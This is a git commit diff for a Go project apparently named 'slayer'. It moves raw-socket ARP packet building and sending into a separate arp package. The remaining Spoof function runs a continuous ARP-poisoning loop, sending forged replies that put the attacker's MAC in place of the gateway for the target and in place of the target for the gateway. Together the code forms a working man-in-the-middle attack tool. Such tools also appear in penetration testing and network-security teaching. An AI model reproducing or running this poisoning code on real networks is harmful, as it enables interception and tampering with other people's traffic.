a52db04da0983ec4a3723e10f6e3f12a167c0958
Prabalesh <prabalesh2008@gmail.com>
2025-07-27 12:00:28 +0530

    refactor: removed arp logic spoof and placed in arp package

--- internal/spoof/spoof.go
+++ internal/spoof/spoof.go
@@ -1,74 +1,12 @@
 package spoof
 
 import (
-	"encoding/binary"
 	"fmt"
 	"net"
-	"syscall"
 	"time"
+
+	"github.com/prabalesh/slayer/internal/networking/arp"
 )
-
-// Converts a MAC address to a byte slice
-func macToBytes(mac net.HardwareAddr) []byte {
-	return []byte(mac)
-}
-
-// Converts an IP address to a byte slice (IPv4)
-func ipToBytes(ip net.IP) []byte {
-	return ip.To4()
-}
-
-// htons converts a uint16 from host to network byte order
-func htons(i uint16) uint16 {
-	return (i<<8)&0xff00 | i>>8
-}
-
-// Constructs a complete Ethernet + ARP packet
-func buildARPPacket(senderMAC, targetMAC net.HardwareAddr, senderIP, targetIP net.IP, opcode uint16) []byte {
-	packet := make([]byte, 42) // Ethernet header (14 bytes) + ARP packet (28 bytes)
-
-	// Ethernet header
-	copy(packet[0:6], targetMAC)  // Destination MAC
-	copy(packet[6:12], senderMAC) // Source MAC
-	packet[12] = 0x08             // EtherType (ARP)
-	packet[13] = 0x06
-
-	// ARP header
-	binary.BigEndian.PutUint16(packet[14:16], 1)      // Hardware type (Ethernet)
-	binary.BigEndian.PutUint16(packet[16:18], 0x0800) // Protocol type (IPv4)
-	packet[18] = 6                                    // Hardware size
-	packet[19] = 4                                    // Protocol size
-	binary.BigEndian.PutUint16(packet[20:22], opcode) // Opcode (1=request, 2=reply)
-
-	copy(packet[22:28], senderMAC)      // Sender MAC
-	copy(packet[28:32], senderIP.To4()) // Sender IP
-	copy(packet[32:38], targetMAC)      // Target MAC
-	copy(packet[38:42], targetIP.To4()) // Target IP
-
-	return packet
-}
-
-// Sends a raw ARP packet using a raw socket
-func sendARP(iface *net.Interface, packet []byte, targetMAC net.HardwareAddr) error {
-	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(0x0806)))
-	if err != nil {
-		return fmt.Errorf("socket error: %v", err)
-	}
-	defer syscall.Close(fd)
-
-	addr := syscall.SockaddrLinklayer{
-		Protocol: htons(0x0806),
-		Ifindex:  iface.Index,
-		Halen:    6,
-	}
-	copy(addr.Addr[:], targetMAC)
-
-	err = syscall.Sendto(fd, packet, 0, &addr)
-	if err != nil {
-		return fmt.Errorf("sendto error: %v", err)
-	}
-	return nil
-}
 
 // Spoof performs continuous ARP poisoning
 func Spoof(iface *net.Interface, targetIP net.IP, targetMAC net.HardwareAddr, gatewayIP net.IP, gatewayMAC net.HardwareAddr) {
@@ -78,14 +16,14 @@ func Spoof(iface *net.Interface, targetIP net.IP, targetMAC net.HardwareAddr, ga
 
 	for {
 		// Poison target: "Gateway is at our MAC"
-		packet1 := buildARPPacket(attackerMAC, targetMAC, gatewayIP, targetIP, 2)
-		if err := sendARP(iface, packet1, targetMAC); err != nil {
+		packet1 := arp.BuildPacket(attackerMAC, targetMAC, gatewayIP, targetIP, 2)
+		if err := arp.Send(iface, packet1, targetMAC); err != nil {
 			fmt.Printf("[!] Failed to send ARP to target: %v\n", err)
 		}
 
 		// Poison gateway: "Target is at our MAC"
-		packet2 := buildARPPacket(attackerMAC, gatewayMAC, targetIP, gatewayIP, 2)
-		if err := sendARP(iface, packet2, gatewayMAC); err != nil {
+		packet2 := arp.BuildPacket(attackerMAC, gatewayMAC, targetIP, gatewayIP, 2)
+		if err := arp.Send(iface, packet2, gatewayMAC); err != nil {
 			fmt.Printf("[!] Failed to send ARP to gateway: %v\n", err)
 		}
 
